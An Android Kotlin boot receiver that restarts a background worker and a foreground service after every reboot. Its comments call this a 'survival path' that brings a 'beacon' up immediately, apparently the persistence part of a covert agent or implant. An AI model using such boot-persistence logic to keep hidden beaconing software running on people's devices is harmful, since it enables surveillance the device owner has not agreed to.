package com.shadow

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action
        if (action == Intent.ACTION_BOOT_COMPLETED || 
            action == "android.intent.action.QUICKBOOT_POWERON" || 
            action == "com.htc.intent.action.QUICKBOOT_POWERON") {
            Log.i("ShadowBoot", "Device booted. Restarting ShadowWorker + foreground service...")
            ShadowWorker.enqueue(context)
            // The foreground service is the survival path — promote the process on boot
            // so the beacon comes up immediately instead of waiting for a WorkManager
            // window. The core is started inside the service's onStartCommand.
            try {
                SyncForegroundService.start(context)
            } catch (e: Exception) {
                Log.e("ShadowBoot", "foreground service start failed: ${e.message}")
            }
        }
    }
}